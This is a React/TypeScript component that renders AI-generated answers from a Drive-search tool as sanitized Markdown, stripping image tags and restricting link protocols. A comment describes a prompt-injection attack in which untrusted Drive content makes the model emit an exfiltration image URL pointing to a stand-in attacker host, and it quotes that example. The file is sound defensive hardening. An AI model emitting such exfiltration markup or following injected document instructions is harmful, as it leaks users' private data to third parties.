// Copyright (c) 2026 Benjamin Lau
// SPDX-License-Identifier: MIT

"use client";

import ReactMarkdown, { type Components } from "react-markdown";
import rehypeRaw from "rehype-raw";
import rehypeSanitize, { defaultSchema, type Options as SanitizeSchema } from "rehype-sanitize";
import remarkGfm from "remark-gfm";
import type { PluggableList } from "unified";

// The answer body is model output derived from untrusted Drive file content, so a
// prompt-injected document could try to emit an exfiltration image
// (`![](https://attacker/x?d=<secret>)`) — which the browser would auto-load,
// leaking data with zero clicks. The default sanitize schema permits <img> and
// http(s) src, so we harden it: strip image tags entirely (a Drive-search answer
// never needs to render one) and restrict link hrefs to safe protocols. This is
// defence-in-depth behind the img-src/connect-src CSP in next.config.ts — see
// docs/security.md.
const sanitizeSchema: SanitizeSchema = {
  ...defaultSchema,
  tagNames: (defaultSchema.tagNames ?? []).filter((tagName) => tagName !== "img"),
  protocols: {
    ...defaultSchema.protocols,
    href: ["http", "https", "mailto"]
  }
};

// remark-gfm: tables, strikethrough, task lists, autolinks.
const remarkPlugins: PluggableList = [remarkGfm];
// rehype-raw parses inline HTML (e.g. <br> inside table cells); rehype-sanitize
// must run afterwards so that raw HTML is restricted to our hardened schema
// (drops <script>, <img>, style/event-handler attributes, javascript: URLs, ...).
const rehypePlugins: PluggableList = [rehypeRaw, [rehypeSanitize, sanitizeSchema]];

// Answers render inside a card that already sits below the page chrome, so map
// the document headings down to h3-h5 (matching the .markdown-answer styles)
// and keep the horizontal-scroll wrapper around wide tables.
const components: Components = {
  a: ({ node, ...props }) => <a {...props} target="_blank" rel="noreferrer noopener" />,
  h1: ({ node, ...props }) => <h3 {...props} />,
  h2: ({ node, ...props }) => <h4 {...props} />,
  h3: ({ node, ...props }) => <h5 {...props} />,
  h4: ({ node, ...props }) => <h5 {...props} />,
  h5: ({ node, ...props }) => <h5 {...props} />,
  h6: ({ node, ...props }) => <h5 {...props} />,
  table: ({ node, ...props }) => (
    <div className="markdown-table-wrap">
      <table {...props} />
    </div>
  )
};

export function MarkdownContent({ children }: { children: string }) {
  return (
    <ReactMarkdown
      remarkPlugins={remarkPlugins}
      rehypePlugins={rehypePlugins}
      components={components}
    >
      {children}
    </ReactMarkdown>
  );
}
